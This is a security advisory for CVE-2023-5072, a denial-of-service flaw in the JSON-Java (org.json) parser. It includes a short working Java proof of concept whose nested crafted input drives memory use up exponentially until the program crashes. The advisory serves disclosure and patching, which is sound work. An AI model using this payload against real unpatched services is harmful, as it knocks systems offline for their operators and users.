# [H] Java: DoS Vulnerability in JSON-JAVA

## Summary
Severity: High
Advisory: GHSA-4jq9-2xhw-jpx7
CVE: CVE-2023-5072
CWE: CWE-358
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2023-11-14
Source: https://github.com/advisories/GHSA-4jq9-2xhw-jpx7
Type: github-advisory

## Affected
- Maven: `org.json:json` — affected >=0 <20231013

## Details
### Summary
A denial of service vulnerability in JSON-Java was discovered by [ClusterFuzz](https://google.github.io/clusterfuzz/).  A bug in the parser means that an input string of modest size can lead to indefinite amounts of memory being used. There are two issues: (1) the parser bug can be used to circumvent a check that is supposed to prevent the key in a JSON object from itself being another JSON object; (2) if a key does end up being a JSON object then it gets converted into a string, using `\` to escape special characters, including `\` itself. So by nesting JSON objects, with a key that is a JSON object that has a key that is a JSON object, and so on, we can get an exponential number of `\` characters in the escaped string.

### Severity
High - Because this is an already-fixed DoS vulnerability, the only remaining impact possible is for existing binaries that have not been updated yet.

### Proof of Concept
```java
package orgjsonbug;

import org.json.JSONObject;

/**
 * Illustrates a bug in JSON-Java.
 */
public class Bug {
  private static String makeNested(int depth) {
    if (depth == 0) {
      return "{\"a\":1}";
    }
    return "{\"a\":1;\t\0" + makeNested(depth - 1) + ":1}";
  }

  public static void main(String[] args) {
    String input = makeNested(30);
    System.out.printf("Input string has length %d: %s\n", input.length(), input);
    JSONObject output = new JSONObject(input);
    System.out.printf("Output JSONObject has length %d: %s\n", output.toString().length(), output);
  }
}
```
When run, this reports that the input string has length 367. Then, after a long pause, the program crashes inside new JSONObject with OutOfMemoryError.

### Further Analysis
The issue is fixed by [this PR](https://github.com/stleary/JSON-java/pull/759).

### Timeline
**Date reported**: 07/14/2023
**Date fixed**: 
**Date disclosed**: 10/12/2023

## References
- https://github.com/google/security-research/security/advisories/GHSA-4jq9-2xhw-jpx7
- https://nvd.nist.gov/vuln/detail/CVE-2023-5072
- https://github.com/stleary/JSON-java/issues/758
- https://github.com/stleary/JSON-java/issues/771
- https://github.com/stleary/JSON-java/pull/759
- https://github.com/stleary/JSON-java/commit/60662e2f8384d3449822a3a1179bfe8de67b55bb
- https://github.com/stleary/JSON-java
